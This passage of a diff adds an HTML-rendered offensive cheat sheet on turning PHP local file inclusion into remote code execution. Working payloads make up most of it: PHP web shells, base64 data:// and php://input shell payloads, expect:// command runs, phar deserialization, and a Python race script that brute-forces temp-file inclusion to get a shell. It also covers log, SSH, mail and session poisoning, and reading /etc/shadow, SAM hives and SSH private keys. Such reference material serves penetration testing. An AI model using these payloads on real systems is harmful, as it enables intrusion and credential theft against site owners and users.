ase64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd&#34;</span>
+</span></span></code></pre></div><h3 id="wrapper-zip">
+  Wrapper zip://
+  <a class="anchor" href="#wrapper-zip">#</a>
+</h3>
+<ol>
+<li>Create an evil payload: <code>echo &quot;&lt;pre&gt;&lt;?php system($_GET['cmd']); ?&gt;&lt;/pre&gt;&quot; &gt; payload.php;</code></li>
+<li>Zip the file</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>zip payload<span style="color:#f92672">.</span>zip payload<span style="color:#f92672">.</span>php;
+</span></span><span style="display:flex;"><span>mv payload<span style="color:#f92672">.</span>zip shell<span style="color:#f92672">.</span>jpg;
+</span></span><span style="display:flex;"><span>rm payload<span style="color:#f92672">.</span>php
+</span></span></code></pre></div><ol start="3">
+<li>Upload the archive and access the file using the wrappers: 
+  <a href="http://example.com/index.php?page=zip://shell.jpg%23payload.php">http://example.com/index.php?page=zip://shell.jpg%23payload.php</a></li>
+</ol>
+<h3 id="wrapper-data">
+  Wrapper data://
+  <a class="anchor" href="#wrapper-data">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.net/<span style="color:#66d9ef">?</span>page=data<span style="color:#960050;background-color:#1e0010">:</span>//text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
+</span></span><span style="display:flex;"><span>NOTE<span style="color:#960050;background-color:#1e0010">:</span> the payload is <span style="color:#e6db74">&#34;&lt;?php system(</span>$_GET<span style="color:#e6db74">[&#39;cmd&#39;]);echo &#39;Shell done !&#39;; ?&gt;&#34;</span>
+</span></span></code></pre></div><p>Fun fact: you can trigger an XSS and bypass the Chrome Auditor with : <code>http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+</code></p>
+<h3 id="wrapper-expect">
+  Wrapper expect://
+  <a class="anchor" href="#wrapper-expect">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=expect<span style="color:#960050;background-color:#1e0010">:</span>//id
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=expect<span style="color:#960050;background-color:#1e0010">:</span>//ls
+</span></span></code></pre></div><h3 id="wrapper-input">
+  Wrapper input://
+  <a class="anchor" href="#wrapper-input">#</a>
+</h3>
+<p>Specify your payload in the POST parameters, this can be done with a simple <code>curl</code> command.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>curl -X POST --data <span style="color:#e6db74">&#34;&lt;?php echo shell_exec(&#39;id&#39;); ?&gt;&#34;</span> <span style="color:#e6db74">&#34;https://example.com/index.php?page=php://input%00&#34;</span> -k -v
+</span></span></code></pre></div><p>Alternatively, Kadimus has a module to automate this attack.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>./kadimus -u <span style="color:#e6db74">&#34;https://example.com/index.php?page=php://input%00&#34;</span>  -C <span style="color:#e6db74">&#39;&lt;?php echo shell_exec(&#34;id&#34;); ?&gt;&#39;</span> -T input
+</span></span></code></pre></div><h3 id="wrapper-phar">
+  Wrapper phar://
+  <a class="anchor" href="#wrapper-phar">#</a>
+</h3>
+<p>Create a phar file with a serialized object in its meta-data.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">// create new Phar
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$phar <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Phar</span>(<span style="color:#e6db74">&#39;test.phar&#39;</span>);
+</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">startBuffering</span>();
+</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">addFromString</span>(<span style="color:#e6db74">&#39;test.txt&#39;</span>, <span style="color:#e6db74">&#39;text&#39;</span>);
+</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setStub</span>(<span style="color:#e6db74">&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// add object of any class as meta data
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AnyClass</span> {}
+</span></span><span style="display:flex;"><span>$object <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">AnyClass</span>;
+</span></span><span style="display:flex;"><span>$object<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;rips&#39;</span>;
+</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setMetadata</span>($object);
+</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">stopBuffering</span>();
+</span></span></code></pre></div><p>If a file operation is now performed on our existing Phar file via the phar:// wrapper, then its serialized meta data is unserialized. If this application has a class named AnyClass and it has the magic method __destruct() or __wakeup() defined, then those methods are automatically invoked</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AnyClass</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> __destruct() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">data</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// output: rips
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#39;phar://test.phar&#39;</span>);
+</span></span></code></pre></div><p>NOTE: The unserialize is triggered for the phar:// wrapper in any file operation, <code>file_exists</code> and many more.</p>
+<h2 id="lfi-to-rce-via-procfd">
+  LFI to RCE via /proc/*/fd
+  <a class="anchor" href="#lfi-to-rce-via-procfd">#</a>
+</h2>
+<ol>
+<li>Upload a lot of shells (for example : 100)</li>
+<li>Include 
+  <a href="http://example.com/index.php?page=/proc/$PID/fd/$FD">http://example.com/index.php?page=/proc/$PID/fd/$FD</a>, with $PID = PID of the process (can be bruteforced) and $FD the filedescriptor (can be bruteforced too)</li>
+</ol>
+<h2 id="lfi-to-rce-via-procselfenviron">
+  LFI to RCE via /proc/self/environ
+  <a class="anchor" href="#lfi-to-rce-via-procselfenviron">#</a>
+</h2>
+<p>Like a log file, send the payload in the User-Agent, it will be reflected inside the /proc/self/environ file</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>GET vulnerable.php<span style="color:#66d9ef">?</span>filename=../../../proc/self/environ HTTP/<span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#960050;background-color:#1e0010">:</span> &lt;?=phpinfo(); ?&gt;
+</span></span></code></pre></div><h2 id="lfi-to-rce-via-upload">
+  LFI to RCE via upload
+  <a class="anchor" href="#lfi-to-rce-via-upload">#</a>
+</h2>
+<p>If you can upload a file, just inject the shell payload in it (e.g : <code>&lt;?php system($_GET['c']); ?&gt;</code> ).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=path/to/uploaded/file.png
+</span></span></code></pre></div><p>In order to keep the file readable it is best to inject into the metadata for the pictures/doc/pdf</p>
+<h2 id="lfi-to-rce-via-upload-race">
+  LFI to RCE via upload (race)
+  <a class="anchor" href="#lfi-to-rce-via-upload-race">#</a>
+</h2>
+<p>Worlds Quitest Let&rsquo;s Play&quot;</p>
+<ul>
+<li>Upload a file and trigger a self-inclusion.</li>
+<li>Repeat 1 a shitload of time to:</li>
+<li>increase our odds of winning the race</li>
+<li>increase our guessing odds</li>
+<li>Bruteforce the inclusion of /tmp/[0-9a-zA-Z]{6}</li>
+<li>Enjoy our shell.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> itertools
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;[+] Trying to win the race&#39;</span>)
+</span></span><span style="display:flex;"><span>f <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;file&#39;</span>: open(<span style="color:#e6db74">&#39;shell.php&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4096</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4096</span>):
+</span></span><span style="display:flex;"><span>    requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#39;http://target.com/index.php?c=index.php&#39;</span>, f)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;[+] Bruteforcing the inclusion&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> fname <span style="color:#f92672">in</span> itertools<span style="color:#f92672">.</span>combinations(string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits, <span style="color:#ae81ff">6</span>):
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://target.com/index.php?c=/tmp/php&#39;</span> <span style="color:#f92672">+</span> fname
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;load average&#39;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:  <span style="color:#75715e"># &lt;?php echo system(&#39;uptime&#39;);</span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+] We have got a shell: &#39;</span> <span style="color:#f92672">+</span> url)
+</span></span><span style="display:flex;"><span>        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;[x] Something went wrong, please try again&#39;</span>)
+</span></span></code></pre></div><h2 id="lfi-to-rce-via-upload-findfirstfile">
+  LFI to RCE via upload (FindFirstFile)
+  <a class="anchor" href="#lfi-to-rce-via-upload-findfirstfile">#</a>
+</h2>
+<p>:warning: Only works on Windows</p>
+<p><code>FindFirstFile</code> allows using masks (<code>&lt;&lt;</code> as <code>*</code> and <code>&gt;</code> as <code>?</code>) in LFI paths on Windows.</p>
+<ul>
+<li>Upload a file, it should be stored in the temp folder <code>C:\Windows\Temp\</code>.</li>
+<li>Include it using <code>http://site/vuln.php?inc=c:\windows\temp\php&lt;&lt;</code></li>
+</ul>
+<h2 id="lfi-to-rce-via-phpinfo">
+  LFI to RCE via phpinfo()
+  <a class="anchor" href="#lfi-to-rce-via-phpinfo">#</a>
+</h2>
+<p>PHPinfo() displays the content of any variables such as <strong>$_GET</strong>, <strong>$_POST</strong> and <strong>$_FILES</strong>.</p>
+<blockquote>
+<p>By making multiple upload posts to the PHPInfo script, and carefully controlling the reads, it is possible to retrieve the name of the temporary file and make a request to the LFI script specifying the temporary file name.</p>
+</blockquote>
+<p>Use the script phpInfoLFI.py (also available at 
+  <a href="https://www.insomniasec.com/downloads/publications/phpinfolfi.py">https://www.insomniasec.com/downloads/publications/phpinfolfi.py</a>)</p>
+<p>Research from 
+  <a href="https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf">https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf</a></p>
+<h2 id="lfi-to-rce-via-controlled-log-file">
+  LFI to RCE via controlled log file
+  <a class="anchor" href="#lfi-to-rce-via-controlled-log-file">#</a>
+</h2>
+<p>Just append your PHP code into the log file by doing a request to the service (Apache, SSH..) and include the log file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=/var/log/apache/access.log
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=/var/log/apache/error.log
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=/var/log/apache2/access.log
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=/var/log/apache2/error.log
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=/var/log/nginx/access.log
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=/var/log/nginx/error.log
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=/var/log/vsftpd.log
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=/var/log/sshd.log
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=/var/log/mail
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=/var/log/httpd/error_log
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=/usr/local/apache/log/error_log
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=/usr/local/apache2/log/error_log
+</span></span></code></pre></div><h3 id="rce-via-ssh">
+  RCE via SSH
+  <a class="anchor" href="#rce-via-ssh">#</a>
+</h3>
+<p>Try to ssh into the box with a PHP code as username <code>&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>ssh &lt;<span style="color:#66d9ef">?</span>php system($_GET[<span style="color:#e6db74">&#34;cmd&#34;</span>]);?&gt;@10.10.10.10
+</span></span></code></pre></div><p>Then include the SSH log files inside the Web Application.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=/var/log/auth.log&amp;cmd=id
+</span></span></code></pre></div><h3 id="rce-via-mail">
+  RCE via Mail
+  <a class="anchor" href="#rce-via-mail">#</a>
+</h3>
+<p>First send an email using the open SMTP then include the log file located at <code>http://example.com/index.php?page=/var/log/mail</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>root@kali<span style="color:#960050;background-color:#1e0010">:</span>~<span style="color:#75715e"># telnet 10.10.10.10. 25</span>
+</span></span><span style="display:flex;"><span>Trying <span style="color:#ae81ff">10.10</span>.10.10....
+</span></span><span style="display:flex;"><span>Connected to <span style="color:#ae81ff">10.10</span>.10.10..
+</span></span><span style="display:flex;"><span>Escape character is <span style="color:#e6db74">&#39;^]&#39;</span>.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span> straylight ESMTP Postfix (Debian/GNU)
+</span></span><span style="display:flex;"><span>helo ok
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">250</span> straylight
+</span></span><span style="display:flex;"><span>mail from<span style="color:#960050;background-color:#1e0010">:</span> mail@example.com
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">250</span> <span style="color:#ae81ff">2.1</span>.0 Ok
+</span></span><span style="display:flex;"><span>rcpt to<span style="color:#960050;background-color:#1e0010">:</span> root
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">250</span> <span style="color:#ae81ff">2.1</span>.5 Ok
+</span></span><span style="display:flex;"><span>data
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">354</span> <span style="color:#66d9ef">End</span> data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
+</span></span><span style="display:flex;"><span>subject<span style="color:#960050;background-color:#1e0010">:</span> &lt;<span style="color:#66d9ef">?</span>php echo system($_GET[<span style="color:#e6db74">&#34;cmd&#34;</span>]); ?&gt;
+</span></span><span style="display:flex;"><span>data2
+</span></span><span style="display:flex;"><span>.
+</span></span></code></pre></div><p>In some cases you can also send the email with the <code>mail</code> command line.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>mail -s <span style="color:#e6db74">&#34;&lt;?php system(</span>$_GET<span style="color:#e6db74">[&#39;cmd&#39;]);?&gt;&#34;</span> www-data@10.10.10.10. &lt; /dev/null
+</span></span></code></pre></div><h3 id="rce-via-apache-logs">
+  RCE via Apache logs
+  <a class="anchor" href="#rce-via-apache-logs">#</a>
+</h3>
+<p>Poison the User-Agent in access logs:</p>
+<pre tabindex="0"><code>$ curl http://example.org/ -A &#34;&lt;?php system(\$_GET[&#39;cmd&#39;]);?&gt;&#34;
+</code></pre><p>Note: The logs will escape double quotes so use single quotes for strings in the PHP payload.</p>
+<p>Then request the logs via the LFI and execute your command.</p>
+<pre tabindex="0"><code>$ curl http://example.org/test.php?page=/var/log/apache2/access.log&amp;cmd=id
+</code></pre><h2 id="lfi-to-rce-via-php-sessions">
+  LFI to RCE via PHP sessions
+  <a class="anchor" href="#lfi-to-rce-via-php-sessions">#</a>
+</h2>
+<p>Check if the website use PHP Session (PHPSESSID)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">Set</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">PHPSESSID</span><span style="color:#f92672">=</span><span style="color:#a6e22e">i56kgbsq9rm8ndg3qbarhsbm27</span>; <span style="color:#a6e22e">path</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">/</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Set</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">user</span><span style="color:#f92672">=</span><span style="color:#a6e22e">admin</span>; <span style="color:#a6e22e">expires</span><span style="color:#f92672">=</span><span style="color:#a6e22e">Mon</span>, <span style="color:#ae81ff">13</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Aug</span><span style="color:#f92672">-</span><span style="color:#ae81ff">2018</span> <span style="color:#ae81ff">20</span><span style="color:#f92672">:</span><span style="color:#ae81ff">21</span><span style="color:#f92672">:</span><span style="color:#ae81ff">29</span> <span style="color:#a6e22e">GMT</span>; <span style="color:#a6e22e">path</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">/; httponly</span>
+</span></span></code></pre></div><p>In PHP these sessions are stored into /var/lib/php5/sess_[PHPSESSID] or /var/lib/php/session/sess_[PHPSESSID] files</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">user_ip</span><span style="color:#f92672">|</span><span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;&#34;</span>;<span style="color:#a6e22e">loggedin</span><span style="color:#f92672">|</span><span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;&#34;</span>;<span style="color:#a6e22e">lang</span><span style="color:#f92672">|</span><span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">9</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;en_us.php&#34;</span>;<span style="color:#a6e22e">win_lin</span><span style="color:#f92672">|</span><span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;&#34;</span>;<span style="color:#a6e22e">user</span><span style="color:#f92672">|</span><span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">6</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;admin&#34;</span>;<span style="color:#a6e22e">pass</span><span style="color:#f92672">|</span><span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">6</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;admin&#34;</span>;
+</span></span></code></pre></div><p>Set the cookie to <code>&lt;?php system('cat /etc/passwd');?&gt;</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>login=<span style="color:#ae81ff">1</span>&amp;user=&lt;<span style="color:#66d9ef">?</span>php system(<span style="color:#e6db74">&#34;cat /etc/passwd&#34;</span>);?&gt;&amp;pass=password&amp;lang=en_us.php
+</span></span></code></pre></div><p>Use the LFI to include the PHP session file</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>login=<span style="color:#ae81ff">1</span>&amp;user=admin&amp;pass=password&amp;lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
+</span></span></code></pre></div><h2 id="lfi-to-rce-via-credentials-files">
+  LFI to RCE via credentials files
+  <a class="anchor" href="#lfi-to-rce-via-credentials-files">#</a>
+</h2>
+<p>This method require high privileges inside the application in order to read the sensitive files.</p>
+<h3 id="windows-version">
+  Windows version
+  <a class="anchor" href="#windows-version">#</a>
+</h3>
+<p>First extract <code>sam</code> and <code>system</code> files.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=../../../../../../WINDOWS/repair/sam
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=../../../../../../WINDOWS/repair/system
+</span></span></code></pre></div><p>Then extract hashes from these files <code>samdump2 SYSTEM SAM &gt; hashes.txt</code>, and crack them with <code>hashcat/john</code> or replay them using the Pass The Hash technique.</p>
+<h3 id="linux-version">
+  Linux version
+  <a class="anchor" href="#linux-version">#</a>
+</h3>
+<p>First extract <code>/etc/shadow</code> files.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=../../../../../../etc/shadow
+</span></span></code></pre></div><p>Then crack the hashes inside in order to login via SSH on the machine.</p>
+<p>Another way to gain SSH access to a Linux machine through LFI is by reading the private key file, id_rsa.
+If SSH is active check which user is being used <code>/proc/self/status</code> and <code>/etc/passwd</code> and try to access <code>/&lt;HOME&gt;/.ssh/id_rsa</code>.</p>
+<h2 id="references">
+  References
+  <a class="anchor" href="#references">#</a>
+</h2>
+<ul>
+<li>
+  <a href="https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion">OWASP LFI</a></li>
+<li>
+  <a href="https://highon.coffee/blog/lfi-cheat-sheet/">HighOn.coffee LFI Cheat</a></li>
+<li>
+  <a href="https://l.avala.mp/?p=241">Turning LFI to RFI</a></li>
+<li>
+  <a href="http://0x191unauthorized.blogspot.fr/2015/04/is-php-vulnerable-and-under-what.html">Is PHP vulnerable and under what conditions?</a></li>
+<li>
+  <a href="https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/">Upgrade from LFI to RCE via PHP Sessions</a></li>
+<li>
+  <a href="http://devels-playground.blogspot.fr/2007/08/local-file-inclusion-tricks.html">Local file inclusion tricks</a></li>
+<li>
+  <a href="https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a">CVV #1: Local File Inclusion - SI9INT</a></li>
+<li>
